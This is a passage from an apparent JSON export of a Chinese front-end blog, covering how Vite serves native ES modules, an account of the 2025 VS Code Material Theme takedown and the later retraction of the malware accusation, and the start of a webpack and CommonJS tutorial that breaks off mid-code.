main.jsx，就可以看到裡面的程式碼： import React from \"/@modules/@pika/react/source.development.js\"; import ReactDOM from \"/@modules/@pika/react-dom/source.development.js\"; import \"/src/index.css?import\"; import App2 from \"/src/App.jsx\"; ReactDOM.render(/* @__PURE__ */ React.createElement(React.StrictMode, null, /* @__PURE__ */ React.createElement(App2, null)), document.getElementById(\"root\")); Vite 在 server side 會幫我們把程式做一點轉換，這邊它會把程式裡的 import React from &#39;react&#39; 換掉，把路徑改成自己準備好的 React build。這是因為 React 官方其實目前還沒有 ESM 的 build！現在大家在用的好像是種 UMD 與 CommonJS 的混合體。未來有計畫要做，但可能需要一段時間，詳情可參考：#11503 Formalize top-level ES exports。 雖然說官方沒有，但社群中已經有人自己先做出來了，所以這邊用的是社群版的。這邊順便補充一個東西，原本的 import React from &#39;react&#39; 被稱為「bare module imports」，bare 指的是後面的 react，它並不是一個檔案路徑。根據 Evan You 的說法，ESM 的標準裡面這是未定義行為，所以要特別處理。 如果我們把前面自己試的 ESM 小範例，import &#123; add &#125; from &#39;./utils.js&#39; 換成 import &#123; add &#125; from &#39;utils.js&#39;，就會出現這個錯誤： Uncaught TypeError: Failed to resolve module specifier “utils.js”. Relative references must start with either “&#x2F;“, “.&#x2F;“, or “..&#x2F;“. 所以一定要是 /、./ 或是 ../ 開頭才行。 接著我們來看 App.jsx： import &#123; createHotContext &#125; from \"/vite/client\"; import.meta.hot = createHotContext(\"/src/App.jsx\"); import RefreshRuntime from \"/@react-refresh\"; let prevRefreshReg; let prevRefreshSig; if (!window.__vite_plugin_react_preamble_installed__) &#123; throw new Error( \"vite-plugin-react can't detect preamble. Something is wrong. See https://github.com/vitejs/vite-plugin-react/pull/11#discussion_r430879201\" ); &#125; if (import.meta.hot) &#123; prevRefreshReg = window.$RefreshReg$; prevRefreshSig = window.$RefreshSig$; window.$RefreshReg$ = (type, id) => &#123; RefreshRuntime.register(type, \"/Users/huli/Documents/lidemy/test/react-demo/src/App.jsx\" + \" \" + id) &#125;; window.$RefreshSig$ = RefreshRuntime.createSignatureFunctionForTransform; &#125;var _s = $RefreshSig$(); import React, &#123; useState &#125; from \"/@modules/@pika/react/source.development.js\"; import logo2 from \"/src/logo.svg?import\"; import \"/src/App.css?import\"; function App2() &#123; _s(); const [count, setCount] = useState(0); return /* @__PURE__ */React.createElement(\"div\", &#123; className: \"App\" &#125;, /* @__PURE__ */React.createElement(\"header\", &#123; className: \"App-header\" &#125;, /* @__PURE__ */React.createElement(\"img\", &#123; src: logo2, className: \"App-logo\", alt: \"logo\" &#125;), /* @__PURE__ */React.createElement(\"p\", null, \"Hello Vite + React!wwaaaa\"), /* @__PURE__ */React.createElement(\"p\", null, /* @__PURE__ */React.createElement(\"button\", &#123; onClick: () => setCount(count2 => count2 + 1) &#125;, \"count is: \", count)), /* @__PURE__ */React.createElement(\"p\", null, \"Edit \", /* @__PURE__ */React.createElement(\"code\", null, \"App.jsx\"), \" and save to test HMR updates.\"), /* @__PURE__ */React.createElement(\"a\", &#123; className: \"App-link\", href: \"https://reactjs.org\", target: \"_blank\", rel: \"noopener noreferrer\" &#125;, \"Learn React\"))); &#125; _s(App2, \"oDgYfYHkD9Wkv4hrAPCkI/ev3YU=\"); _c = App2; export default App2; var _c; $RefreshReg$(_c, \"App2\"); if (import.meta.hot) &#123; window.$RefreshReg$ = prevRefreshReg; window.$RefreshSig$ = prevRefreshSig; import.meta.hot.accept(); RefreshRuntime.performReactRefresh(); &#125; 可以看到原本的 jsx 已經在 server 被轉成了 JS，然後有些與 HMR（Hot Module Reload）有關的程式碼。如果你試著修改 source code 然後存檔，會發現 network request 的網址上多了一個 timestamp： 可以猜出這應該跟 cache invalidation 有關，在 reload module 的時候避免載入到舊的，所以加上一個 timestamp 強制重新抓取。 最後我們來看一下 CSS 的部分是怎麼處理的： import &#123; updateStyle &#125; from \"/vite/client\" const css = \".App &#123;\\n text-align: center;\\n&#125;\\n\\n.App-logo &#123;\\n height: 40vmin;\\n pointer-events: none;\\n&#125;\\n\\n@media (prefers-reduced-motion: no-preference) &#123;\\n .App-logo &#123;\\n animation: App-logo-spin infinite 20s linear;\\n &#125;\\n&#125;\\n\\n.App-header &#123;\\n background-color: #282c34;\\n min-height: 100vh;\\n display: flex;\\n flex-direction: column;\\n align-items: center;\\n justify-content: center;\\n font-size: calc(10px + 2vmin);\\n color: white;\\n&#125;\\n\\n.App-link &#123;\\n color: #61dafb;\\n&#125;\\n\\n@keyframes App-logo-spin &#123;\\n from &#123;\\n transform: rotate(0deg);\\n &#125;\\n to &#123;\\n transform: rotate(360deg);\\n &#125;\\n&#125;\\n\\nbutton &#123;\\n font-size: calc(10px + 2vmin);\\n&#125;\\n\" updateStyle(\"\\\"7ac702d2\\\"\", css) export default css 把 CSS 變成一個字串，然後呼叫 updateStyle 這個 function。只要是在 client 載入 vite，就會自動一起載入 /vite/client 這個 utils，裡面會處理像是 HMR 或者是載入 CSS，例如說上面的 updateStyle 就在這個檔案裡面。 好，寫到這邊其實我們大致上了解 vite 的面貌了。為什麼它比較快？因為 webpack 需要 bundle，可是 vite 不需要，所以它不需要把你的 source code 全都包在一起，它只需要起一個 local server，讓你的 import 可以抓到正確的檔案就好了。少了打包，速度自然快很多，這就是 Natvie ESM 的威力。 How about production?只要下 npx vite build 就可以產生 production build，但產出的檔案或許會讓你小失望，因為就跟 webpack 一樣，是個很大包的 index.js，所有程式碼都在裡面。 這是因為 production 目前就是用 rollup 幫你去 build，就是走傳統的打包策略了，就跟 webpack 沒兩樣。原因 vite 的 docs 也已經跟你說了： Vite does utilize bundling for production builds, because native ES module imports result in waterfall network requests that are simply too punishing for page load time in production. 跟大家解釋一下這個問題是什麼，問題就來自於套件之間的 dependecy。 假設你用了一個套件 A，它需要去載入套件 B，然後套件 B 依賴於套件 C，就這樣一直互相依賴，然後相連到天邊，就產生了很長一大串的依賴鍊。那瀏覽器就要等到這些套件全部都下載完成以後才能開始執行 JavaScript，這就是原文說的「waterfall network requests」，所以在 production 上這樣用的話是有問題的。 尤其是 HTTP&#x2F;1.1，瀏覽器都會有 parallel 的上限，大部分是 5 個上下，所以如果你有 60 個 dependencies 要下載，就需要等好長一段時間。雖然說 HTTP&#x2F;2 多少可以改善這問題，但若是東西太多，依然沒辦法。 那為什麼在 local 不會有問題呢？因為 local server 的下載時間幾乎是 0 啊！所以這是在 production 上面才會有的 issue。而這個問題已經有人在試著解決，例如說 pika： Pika is building a world where third-party libraries can be loaded, cached, and shared across sites 依照我的理解，就有點像是如果所有人的 ESM 都從 pika 下載，那瀏覽器就可以 cache 住這些套件，下載過的就不需要再下載一次，速度就會快上許多。不過當然還有其他問題有待解決，例如說瀏覽器會提供這麼多空間給你放嗎？等等之類的。 結語Vite 最近好像掀起了一股小小的炫風，在一些開源專案中都會看到有人問說是不是有機會改用 vite 作為 dev server。雖然說 snowpack 已經出來一陣子了，但是 Native ESM 的這個用法，應該是到 vite 紅起來才比較廣為人知。 我自己是覺得在 local 開發的時候，ESM 的確是能讓速度快上許多，是個很值得嘗試的方向，我甚至認為未來可能這會是標準的開發方式，取代原本的 bundler。而在 production 上面如果能解決剛剛說的 waterfall 問題，或許就能產生兩種 target，一種是 target modern browser，直接用 ESM + ES6 輸出，少了許多 build 的時間；另一種是針對比較舊的瀏覽器，就走老路用 webpack 或是 rollup 等等。 Evan You 之前有跟 Adam Wathan（Tailwind CSS 的作者）錄了一集 podcast，有講到為什麼會想做 vite，以及 vite 在未來發展方向或者是 production build 會碰到的問題等等，很推薦大家去聽聽看：140: Evan You - Reimagining the Modern Dev Server with Vite。","link":"/2020/08/07/vite-and-esmodules/"},{"title":"VS Code Material Theme 不是惡意軟體——安全的線該畫在哪？","text":"應該不少人都有跟到三週前 VS Code 上的知名套件 Material Theme 被微軟主動下架的新聞，那下架的理由是什麼呢？根據你得知這件事的消息來源以及自身個性，可能會有兩種回答： 它「疑似」含有惡意程式碼 它就是個惡意軟體 為什麼跟自身個性有關呢？因為就算消息來源接收到的是第一種，在種種條件的互相加持影響之下，你也很有可能解釋成第二種。 以台灣的消息來源來說，最多人看到的應該是保哥的這篇臉書貼文，內文寫著： 微軟緊急下架擁有 900 萬次下載的知名 Material Theme Icons 與 Material Theme Free 擴充套件，這些看似無害的佈景主題擴充被發現暗藏高度混淆的惡意代碼，可能導致大規模開發者帳戶資料外洩！ 🔥事件關鍵點：1️⃣ 網路安全研究員 Amit Assaraf 團隊在例行掃描中發現，這些主題擴展中的 release-notes.js 檔案存在大量混淆過的 JavaScript 程式，其中包含對使用者名稱、密碼等敏感資訊的存取。 2️⃣ 專家推測這可能是透過 2023 年某次更新植入的供應鏈攻擊，或開發者帳號遭黑客劫持所致。 微軟不僅下架了所有相關擴充套件，還直接封鎖了開發者 Mattia Astorino (equinusocio) 的帳號，並強制卸載全球使用者端已安裝的擴充套件。這是 VS Marketplace 近三年來最大規模的安全清理行動！👍 附件連結是 GitHub Issues 討論，非常熱鬧，愛吃瓜的鄉民快去朝聖啊！👨‍💻#還好我不愛Material #供應鏈攻擊 #記得VSCode連網升級一下 內文寫了「被發現暗藏高度混淆的惡意代碼」，直接認定是惡意軟體了。再加上文中附上的其他證據，混淆過的程式碼以及對敏感資訊的存取等等，還主動被微軟下架，不覺得是惡意軟體都難。 而底下留言附的資安人報導《資安風險！微軟禁下載量達900萬次的VSCode Material Theme擴充套件》 中，寫的就相對保守一點： 微軟近日從Visual Studio Marketplace中移除了兩個廣受歡迎的VSCode擴充套件：「Material Theme – Free」和「Material Theme Icons – Free」，原因是這些擴充套件被發現可能包含惡意程式碼。 用的字眼是「可能包含惡意程式碼」，就是我所說的第一種。但與上面的貼文類似，報導中還說明有資安團隊發現了可疑的程式碼，又混淆又跟帳號密碼有關。因此，儘管報導本身並沒有明確寫出它就是個惡意軟體，只有寫「可能包含惡意程式碼」，在其他證據的加持下，你或許也會認為它就是個惡意軟體。 除了這些，言之鑿鑿說 Material Theme 就是個惡意軟體的新聞或是推文也都還有很多，例如說 20 萬人追蹤的 @theo 就直接說了： The Material Theme has just been removed from GitHub and VS Code due to shipping malware 那到底 VS Code 上的 Material Theme 擴充套件是不是惡意軟體呢？先講結論：「不是」。 那這整件事情的過程到底是如何？為什麼一開始說疑似是惡意軟體，後來又不是了？我們按照時間順序，先從開頭來聊聊吧。 事情的開端與下架的理由（底下時間都是指台灣時間） 2025&#x2F;02&#x2F;26 凌晨 01:32，有人在 Material Theme 的 GitHub 上發了一個 issue：This extension was reported to be problematic，內文中提到在 VS Code 中會出現底下的提示： We have uninstalled ‘equinusocio.vsc-material-theme’ which was reported to be problematic. 證明至少在這個時間點，微軟已經主動把 VS Code 中的 Material theme 移除。過了幾個小時，在 04:39 時，知名的討論區 reddit 中也有人發文討論相同的狀況：Lost Material Theme。 到了早上 7 點，Hacker News 上也開始有人討論：Material Theme has been pulled from VS Code’s marketplace 。 大約下午 3 點 40 分的時候，VS Code 的團隊成員 Isidor 出來回覆了： Hi - Isidor here from the VS Code team.A member of the community did a deep security analysis of the extension and found multiple red flags that indicate malicious intent and reported this to us. Our security researchers at Microsoft confirmed this claims and found additional suspicious code. We banned the publisher from the VS Marketplace and removed all of their extensions and uninstalled from all VS Code instances that have this extension running. For clarity - the removal had nothing to do about copyright&#x2F;licenses, only about potential malicious intent. Expect an announcement here with more details soon https://github.com/microsoft/vsmarketplace/ As a reminder, the VS Marketplace continuously invests in security. And more about extension runtime trust can be found in this article https://code.visualstudio.com/docs/editor/extension-runtime-security Thank you! 大意就是社群中有人對這個套件做了深度的資安分析，找到了多個 red flags 指出這個套件具有惡意的意圖並向微軟回報，而微軟內部的資安研究員也確認了這個發現，並找出其他可疑的程式碼。微軟已經把這個開發者的套件都下架以及把他 ban 掉，並說明這次移除套件的行為與 license 無關（這我們等等談），只跟潛在的可疑意圖有關。 到了晚上 11 點，有人在 Visual Studio Marketplace 的 GitHub 中開了一個 issue 討論這件事：Material theme compromised?，想知道更多的細節。 而 VS Code Marketplace 的 PM seaniyer 也在 2&#x2F;27 早上 9 點 57 的時候給出了回覆： Sean here from VS Code Marketplace. We take the decision to remove seriously and thoroughly verify any reports. To protect developers, we also prioritize speedy removal of positives. We’ve posted the reason for removal in RemovedPackages, where we plan to add any future removals as well. Thanks for helping to keep the marketplace safe for everyone.我們對移除決策持謹慎態度，並會徹底驗證所有舉報。為了保護開發者，我們也優先迅速移除確定存在問題的項目。我們已在 RemovedPackages 中發布了移除原因，並計劃未來將所有移除記錄統一發布在該處。 RemovedPackages.md 這個檔案是在當天早上 7 點才被建立的，或許代表這是微軟第一次主動把套件下架？ 在文件中寫了被下架的套件是 Equinusocio.vsc-material-theme-icons（另一個相同作者的套件，他有兩個，一個是 Material Theme 另一個是 Material Theme Icons），理由是： A theming extension with heavily obfuscated code and unreasonable dependencies including a utility for running child processes一個主題擴充功能，其程式碼經過高度混淆，並包含不合理的依賴項，例如用於執行 child process 的 utility。 而有一間資安公司 Koi Security，在 2025&#x2F;02&#x2F;27 發布了文章 A Wolf in Dark Mode: The Malicious VS Code Theme That Fooled Millions，提到了他們在 Material Theme 中找到惡意程式碼，看起來是經由一個 dependency 所引入的： Say hello to the wolf in dark mode, “Material Theme”, an extremely popular VSCode theme extension, found to be containing malware underneath it’s beautiful color scheme Material Theme — Free, a theme extension for VSCode, which was installed 3,927,094 times by developers, was found to contain malicious code through a dependency The malicious code seems to be inside a dependency of the theme, which was compromised. 這裡用的詞是「was found to contain malicious code」，也是直接說了包含惡意程式碼。 作者的反駁2&#x2F;28 將近下午 5 點，Material Theme 的作者 @equinusocio 在 Visual Studio Marketplace 的 GitHub 中開了個 issue：Asking for Equinusocio publisher restoration and relative extensions, censorship and shady discriminatory microsoft moves，大意就是說它的套件裡面沒有惡意程式碼，唯一有的問題是一個太舊的第三方套件： This decision destroyed 10 years of reputation and trust, all based on unfounded SUSPICIONS regarding obfuscated code—something you dislike, even though there was no evidence of harm. The only issue was an outdated sanity.io dependency within the obfuscated code, which could have been fixed in 30 seconds.這個決定毀掉了 10 年來的聲譽和信任，而這一切都基於對混淆程式碼毫無根據的懷疑——只是因為你不喜歡它，儘管並沒有任何危害的證據。唯一的問題是混淆程式碼中存在一個過時的 sanity.io 依賴，而這本可以在 30 秒內修復。 文末也提到如果確認他的套件沒有惡意程式碼，請恢復所有的 extensions 以及公開道歉： If your review of MY SOURCE CODE confirms that there is nothing malicious, I formally request the full restoration of our publisher accounts (Equinusocio and vira-theme), all related extensions, and user access to the theme. Additionally, all installations and insights should be reinstated. Material Theme 為什麼會被懷疑？整理一下上面的論述，會發現 Material Theme 確實幹了這麼幾件事情： 明明是個 theme，但套件裡有 JavaScript 具有混淆過的程式碼 程式碼中有與 username 跟 password 有關的部分 含有拿來執行 child processes 的 utility 你問我可不可疑，可疑啊，當然可疑。但如果你問我它是不是惡意程式，我會說不是。 為什麼不是？因為沒有人給出證據啊。儘管把程式碼混淆確實可疑，但也就只是可疑而已。更何況這個「可疑」的力度在我看來並沒有這麼強。舉例來講，沒有找到跟惡意 server 通信的證據或是可疑的後門等等。 除此之外，關於混淆這點，如果有了解過情況的話，就會發現早在 2024 年 8 月，Reddit 上就有人發了一篇 Has the Material Theme extension been compromised?，說最新的版本含有大量混淆過的程式碼，GitHub 上的歷史紀錄也已經被刪除，問說是發生什麼事了。 有人說可能跟作者在 8&#x2F;10 發起的這兩個討論有關： ⚠️ Looking for Typescript maintainer ⚠️ Premium extensions 因為作者想把這個套件從開源變成閉源，並且發展收費版，因此才用混淆的方式把一些邏輯藏起來。 而所謂的「程式碼中有與 username 跟 password 有關的部分」，也很可能是因為某個第三方套件使用了 url-parser，因此這些帳號密碼指的是在解析 URL 時網址上的帳號密碼，而不是什麼偷取你電腦中的敏感資訊。 至於「拿來執行 child processes 的 utility」，有人把程式碼反混淆之後來看，就只是個 build script，沒有執行任何惡意指令。 （話說上面這兩點我沒有親自驗證，擴充套件的原始碼一直都可以下載，有興趣的人可以親自看看：https://marketplace.visualstudio.com/_apis/public/gallery/publishers/Equinusocio/vsextensions/vsc-material-theme/34.7.9/vspackage ） 而 Koi Security 的那篇文章也完全沒有任何明確證據，這邊我的立場跟 RE: VSCode Extension Drama 這篇文章的副標題一樣：You can’t run your threat response like a High School clique。 當然，先撇除 Material Theme 不談，這個作者本身原本就有不少不符合開源精神的行為，這也是為什麼前面提到的微軟聲明中，會說：「For clarity - the removal had nothing to do about copyright&#x2F;licenses, only about potential malicious intent.」，但因為這些都跟擴充套件是否為惡意軟體這件事無關，所以這邊就不多談了。 而一開始應該是只有 Material Theme 跟 Material Theme Icons 被下架且移除，但之後作者開了新帳號改名又傳了一次，被發現多次後整個帳號被 ban 掉，這個從 reddit 的討論串中可以看出來。 總之呢，這個 @r8 的評論滿精準地說出我的想法： Being an ass is not a crime. If you want to ban Mattia for being an ass (which, I’m sorry to say, he is), that’s what Codes of Conduct were invented for. 「疑似」與「確實」，重要的一線之隔我想討論的問題是：「VS Code 團隊下架 Material Theme 套件是否合理？」 但因為這個問題背後其實藏著兩三個子問題，因此我決定先把問題切小，第一件可以來聊的事情是，當發現「疑似含有惡意程式碼」的套件時，把它下架是否合理？ 預防勝於治療，在還沒出事之前先止損，我認為是合理的。 那第二個延伸問題就是：「既然只是疑似，那有多少把握的時候，下架才是合理的？」 這其實是個「畫線」的問題。 舉例來說，如果只是在 theme 的套件中發現沒混淆過的 JavaScript 檔案，下架可能就不太合理。但如果是在 theme 的套件中發現混淆過的 JavaScript 呢？（內容你還不知道是什麼，就只知道有混淆過），對有些人說可能就覺得應該下架了。 但也有些人會覺得，一定要找到確切的證據才能下架，只是在懷疑階段都不行。 所以我說這是一個畫線問題，取決於你要把線畫在哪邊，要滿足哪些條件，才會覺得足夠可疑，可疑到要把它下架。這個標準每個人、每個組織都會不一樣。 想好這兩個問題以後，再來討論：「VS Code 團隊下架 Material Theme 套件是否合理？」，以他們的角度來看，已知的訊息大概是： 明明是個 theme，但套件裡有 JavaScript，還是混淆過的 含有拿來執行 child processes 的 utility 這個套件有數百萬下載 當他們做決定前，必須知道這個決定的會帶來的影響。 舉例來說，這是 VS Code 團隊第一次做這件事，因此就算只是「懷疑有問題」，也可能會被解讀為具有足夠的信心，才會大動作遠端主動移除套件。此外，如果最後真的證明是惡意套件那倒是沒事，但如果不是呢？那是否在對外發表聲明時應該格外小心，強調只是疑似，在證據還沒這麼明確的狀況下，盡量不傷害開發者的名聲？ 另一個問題是，既然「沒有證據」這件事會影響決定，那是否這條線應該畫得更嚴格一點，只有掌握切確證據以後才做決定？畢竟如果最後證實套件其實沒問題，外界對微軟的資安能力也會感到質疑（像是，我以為你有足夠的證據才做這些，結果居然說是誤報）。 總之呢，我也不知道 VS Code 團隊掌握了多少證據，但他們最後做的決定大家都知道了，就是強制移除套件以保護使用者。 大結局：VS Code 團隊的道歉事件過了一個多禮拜之後，在 3&#x2F;7 時微軟經由這個 PR：Update RemovedPackages.md，把 Material Theme 從清單中移除。 而 3&#x2F;12 時在作者發的那個 Issue 底下發表了公開聲明進行道歉： False positives suck, and it hurts when it happens.誤判很糟糕，當它發生時確實令人痛心。 The publisher account for Material Theme and Material Theme Icons (Equinusocio) was mistakenly flagged and has now been restored. In the interest of safety, we moved fast and we messed up. We removed these themes because they fired off multiple malware detection indicators inside Microsoft, and our investigation came to the wrong conclusion. We care deeply about the security of the VS Code ecosystem, and acted quickly to protect our users.Material Theme 和 Material Theme Icons（Equinusocio）的發佈者帳戶被錯誤標記，現在已經恢復。出於安全考量，我們行動迅速，但也因此犯了錯。我們移除了這些佈景主題，因為它們在微軟內部觸發了多個惡意軟體偵測指標，而我們的調查最終得出了錯誤的結論。我們非常重視 VS Code 生態系統的安全性，因此迅速採取行動來保護使用者。 I understand that the “Equinusocio” extensions author’s frustration and intense reaction, and we hear you. It’s bad but sometimes things like this happen. We do our best - we’re humans, and we hope to move on from this We will clarify our policy on obfuscated code and we will update our scanners and investigation process to reduce the likelihood of another event like this.These extensions are safe and have been restored for the VS Code community to enjoy.我們理解「Equinusocio」擴充套件作者的沮喪與強烈反應，我們聽到了。這件事很糟糕，但有時候這類情況難以避免。我們盡力而為，但我們也是人，希望能夠從這次事件中吸取教訓並向前邁進。我們將明確關於混淆程式碼的政策，並更新我們的掃描工具與調查流程，以降低類似事件再次發生的可能性。這些擴充套件是安全的，現在已經恢復，VS Code 社群可以繼續使用並享受它們。 LINKS:Material Theme[Material Theme Icons](https://marketplace.visualstudio.com/items?itemName=Equinusocio.vsc-material-theme-icons) Again, we apologize that the author got caught up in the blast radius and we look forward to their future themes and extensions. We’ve corresponded with him and thanked him for his patience.我們再次對這位作者受到牽連而深表歉意，也期待他未來的佈景主題與擴充套件。我們已與他聯繫，並感謝他的耐心等待。 Scott Hanselman and the Visual Studio Code Marketplace Team - @shanselman 所以，儘管它有著一些確實可疑的行為，但是 Material Theme 自始至終都不是個惡意軟體。 不過從聲明中能看出來從他們的角度，在做決定時應該有滿高的信心，畢竟內部的惡意軟體偵測都這麼說了（雖然最後是 false positive）。 如果是我的話，可能也會決定下架吧，因此我是能理解這個決定的。 但我覺得下架時的說明應該要更清楚一點，多次強調「事件還在調查，還沒確定是惡意軟體」，要不斷強調「還在驗證，只是為了保護使用者所以先移除」這件事。 雖然 VS Code 團隊本來就沒有明確表示是惡意軟體，但表達更像是「雖然還沒完全確定，但我滿有自信它是」，而不是「還沒確認是惡意軟體，請大家不要先恐慌，等我們驗證」。 最後整理一下我的立場，我目前的立場是，高度可疑的套件下架是合理的，我也認同 VS Code 團隊這樣做。但為了避免 false positive，在對外聲明時必須格外小心，否則對開發者名聲的傷害是難以挽回的，而我認為這次 VS Code 團隊在這點上並沒有做好。 就舉這次事件為例，儘管 VS Code 的道歉聲明已經是 3 天前發的了，又有多少人知道呢？會不會大多數的人還是認為 Material Theme 是個惡意軟體呢？ 話說 BleepingComputer 在 Microsoft apologizes for removing VSCode extensions used by millions 一文中有去問一開始回報問題的資安公司，他們還是覺得有惡意程式碼： When asked by BleepingComputer about this development, cybersecurity researcher Amit Assaraf continued to claim that the extension did contain malicious code. However, there was no malicious intent from the publisher, commenting that “in this case, Microsoft moved too fast.”當 BleepingComputer 詢問此事時，資安研究員 Amit Assaraf 仍堅稱該擴充套件包含惡意程式碼。然而，他表示發佈者並無惡意，並評論道：「在這種情況下，微軟行動得太快了。」 但目前看起來，還是沒有提供相關證據。","link":"/2025/03/16/vscode-material-theme-is-not-a-malware/"},{"title":"webpack 新手教學之淺談模組化與 snowpack","text":"前言在我的部落格裡面，其實很少有工具類的教學文章。一來是因為這種工具類文章都大同小異，二來是我生性懶惰，許多手把手教學都需要鉅細靡遺外加豐富截圖，實在是不適合我。 但這次會來寫這個題目，是因為我覺得 webpack 是個新手不容易懂，就算懂了也不一定是真的懂的工具。或是換句話說，它是常常被誤解的一個工具。 這並不是 webpack 本身的問題，而是現在許多新手切入前端都直接從 React 或是 Vue 開始，而且都使用了他們各自提供的 CLI 工具，等到要客製化一些設定時才注意到：「阿，原來有個東西叫做 webpack」。 CLI 工具帶來了方便性，優點是讓新手能夠快速上手，不用去管那些繁瑣的設定；而缺點就是若是新手沒有意識到背後那些工具，等到哪一天工具壞了、不能用了或是有地方需要修改，就是噩夢的開始。 為了讓這種情況減少，我才決定寫這篇文章，希望從源頭帶大家認識 webpack 這項工具以及模組化的概念。你必須先知道什麼是模組，才能理解什麼是 webpack。 開頭我想先透過幾個問題讓大家思考自己對模組化以及 webpack 是否熟悉： 為什麼很多專案（例如說 React）在部署前都要先 build？這個步驟在幹嘛你知道嗎？ 你知道 require/module.exports 與 import/export 的差別嗎？ 你知道 import 與 export 這兩個語法在瀏覽器上面不是隨便就能使用嗎？ 你知道為什麼要用 webpack 嗎？ 你知道 webpack 為什麼要有 loader 嗎？ 這些問題應該會在讀這篇文章時慢慢有點靈感，在最後面時會幫大家解答。 模組化相信大家應該都聽過模組這個詞，英文叫做 module，這邊先舉個簡單的例子。 例如說你的手機，螢幕壞掉了可以只換螢幕，相機壞掉了就換相機，電池壞掉了換電池。你可能會想說：「咦，那不然呢？」 你有想過為什麼可以這樣換嗎？因為螢幕跟相機是兩個完全獨立開來的功能，互不干擾也沒有相依性，所以換螢幕不會讓相機功能壞掉，反之亦然。這其實就是模組化的概念，螢幕是一個模組，只負責顯示資訊這項功能，而相機又是另外一個模組，負責拍照。透過手機的軟體把螢幕與相機整合起來，讓相機捕捉到的畫面在螢幕上顯示。 若是沒有模組化的概念，一整台手機就真的是一整台，每個功能都互相綁在一起，相機壞掉了，就要把整台手機都換掉，沒辦法只換相機。 如果以程式碼來講，大概會像這樣子： import 相機 import 螢幕 import AA電池 import sim卡 Phone.start(相機, 螢幕, AA電池, sim卡) 模組化的好處之一就是方便抽換，若是今天要用別家的電池，就只要把電池那邊改掉就好了，其他地方都不用動： import 相機 import 螢幕 import BB 電池 import sim卡 Phone.start(相機, 螢幕, BB 電池, sim卡) 寫程式的時候也是這樣子的，我們常常會用到許多系統內建的模組或者是別人寫的模組，以 Node.js 為例，可以使用內建的 os 模組，來獲取作業系統相關的資訊，例如說作業系統是哪個平台： var os = require('os') console.log(os.platform()) // darwin 在這邊我們使用了 require 將系統內建的 os 模組引入進來，並且呼叫 os.platform() 來取得資訊。 這就是在程式裡面最基礎的模組的使用。有了這個概念之後，我們可以把範圍縮小，來談談在 Node.js 裡面模組化是怎麼運作的。（我認為要理解模組化這個概念，對 Node.js 有基本的理解是很重要的，若是你完全不會的話很建議去學一點點，至少知道它在幹嘛） Node.js 的模組前面已經有提到在 Node.js 裡面我們可以使用 require 把內建模組給引入。那如果我們想要自己做一個模組該怎麼辦呢？用 module.exports 這個語法就可以達成。 例如說我們有個 utils.js，裡面有一個會常常用到的計算價格的函式 calculate： // utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; module.exports = calculate // 把這個函式 export 出去 那我們在另外一個檔案 main.js，就可以使用 require 這個語法來引入： // main.js var calculate = require('./utils') console.log(calculate(30)) // 9 我們在 utils.js 裡面 module.exports 什麼，在其他地方用 require(&#39;./utils&#39;) 就會引入什麼。所以你可以把 var calculate = require(&#39;./utils&#39;) 想成 var calculate = （utils.js 裡的）module.exports。 再來看一個範例，我們把 utils.js 輸出的東西改成一個物件： function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; // 把這個物件 export 出去 在 main.js 裡面，就一樣可以拿到這個物件： var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello 這就是在 Node.js 裡面最基本的模組使用的概念，用 module.exports 把東西導出，用 require 把模組引入。 上面所講的這一套模組機制，其實並不在 JavaScript 的規範裡面，而是一套叫做「CommonJS」的標準。 看到這邊相信應該有些人開始有點頭痛了，想說「蛤？這是什麼意思？」 大家設想一個情境就知道了。 讓我們先回到 ES6 出現之前，在那個年代 JavaScript 本身並沒有規範任何與模組相關的使用機制。 這時候大家就可以天馬行空提出自己的想法，例如說 A 可能會覺得那不如這樣寫： // utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; out = &#123; cal: calculate, name: 'hello' &#125; // main.js var obj = include('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello 要輸出模組的時候用 out，要引入的時候用 include。 而 B 也可以說這樣比較好： // utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; EXP = &#123; cal: calculate, name: 'hello' &#125; // main.js var obj = in('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello 要輸出模組的時候用 EXP，要引入的時候用 in。 所以 A 發想出來的規範就叫做 A 標準，B 的就叫 B 標準，這兩個標準都可以達成模組化，但是語法跟背後實作不一樣。而 CommonJS 就只是其中一個標準而已，這個標準就是在輸出模組時用 module.exports，引入時用 require。 而後來 CommonJS 這個標準被 Node.js 所採用，所以才會有我們現在看到的這種形式。 有注意到上面我們一直在講 Node.js 嗎？ 那瀏覽器呢？抱歉，瀏覽器原生不支援這個東西。所以你在瀏覽器上面，沒辦法用 module.exports，也沒辦法用 require。 有些人會說：「你騙人！那為什麼我公司的專案用了這些也可以跑在瀏覽器上」，呵呵，我沒騙人，瀏覽器原生不支援沒錯，但你可以借助其他工具來達成這個目的（對，你現在知道為什麼要用 webpack 了吧）。 不過在介紹工具以前，我們先來試著自己解決看看這個問題。 手動加入 CommonJS 支援在 CommonJS 模組標準裡面，最重要的就是兩個： module.exports require 前面有提到過： 我們在 utils.js 裡面 module.exports 什麼，在其他地方用 require(&#39;./utils&#39;) 就會引入什麼。所以可以把 var calculate = require(&#39;./utils&#39;) 想成 var calculate = （utils.js 裡的）module.exports。 因此，我們可以試著加入一些程式碼，讓 require(&#39;./utils.js) 回傳的東西就是 utils.js 裡的 module.exports，就大功告成了。 第一步，先把原本 main.js 的內容用一個叫做 main 的 function 包住，並且傳入 require： function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello &#125; 再來我們也把 utils.js 的內容包住，因為 utils.js 沒有使用到 require，所以我們改成傳進去一個參數 module，會變成這樣： function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; function utils(module) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; 以上只是用兩個 function 把原本的兩個檔案包起來並且傳入參數而已。 接著我們可以在外面宣告一個變數 m，並且傳進去 utils 裡面然後呼叫： function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; function utils(module) &#123; function calculate(n) 